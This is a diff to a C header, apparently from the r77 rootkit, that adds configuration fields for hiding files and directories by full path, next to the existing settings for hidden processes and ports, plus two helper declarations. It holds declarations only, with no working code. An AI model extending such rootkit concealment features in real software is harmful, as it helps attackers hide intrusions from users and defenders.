@@ -59,6 +59,10 @@
 /// </summary>
 #define R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES		100
 /// <summary>
+/// The maximum number of files or directories that can be hidden by full path.
+/// </summary>
+#define R77_CONFIG_MAX_HIDDEN_PATHS				100
+/// <summary>
 /// The maximum number of local TCP ports that can be hidden.
 /// </summary>
 #define R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS	100
@@ -136,6 +140,14 @@ typedef struct _R77_CONFIG
 	/// </summary>
 	LPWSTR *HiddenProcessNames;
 	/// <summary>
+	/// The number of files or directories to hide.
+	/// </summary>
+	DWORD HiddenPathCount;
+	/// <summary>
+	/// An array of file or directory full paths to hide in addition to files and directories hidden by the prefix.
+	/// </summary>
+	LPWSTR *HiddenPaths;
+	/// <summary>
 	/// The number of hidden local TCP ports.
 	/// </summary>
 	DWORD HiddenTcpLocalPortCount;
@@ -187,6 +199,14 @@ VOID InitializeApi(DWORD flags);
 /// <param name="str">A buffer of unicode characters to write the string to.</param>
 /// <param name="length">The number of characters to write.</param>
 VOID RandomString(PWCHAR str, DWORD length);
+/// <summary>
+/// Converts a LPCWSTR into a null terminated LPCSTR.
+/// </summary>
+/// <param name="str">The LPCWSTR to convert.</param>
+/// <returns>
+/// A newly allocated LPCSTR with the converted LPCWSTR.
+/// </returns>
+LPCSTR ConvertStringToAString(LPCWSTR str);
 /// <summary>
 /// Converts a UNICODE_STRING into a null terminated LPWSTR.
 /// </summary>
@@ -275,6 +295,17 @@ BOOL EnabledDebugPrivilege();
 /// otherwise, FALSE.
 /// </returns>
 BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size);
+/// <summary>
+/// Retrieves the full path from a file handle.
+/// </summary>
+/// <param name="file">A file handle to retrieve the path from.</param>
+/// <param name="fileName">A buffer to write the path to.</param>
+/// <param name="fileNameLength">The length of the fileName buffer.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength);
 /// <summary>
 /// Reads the contents of a file.
 /// </summary>
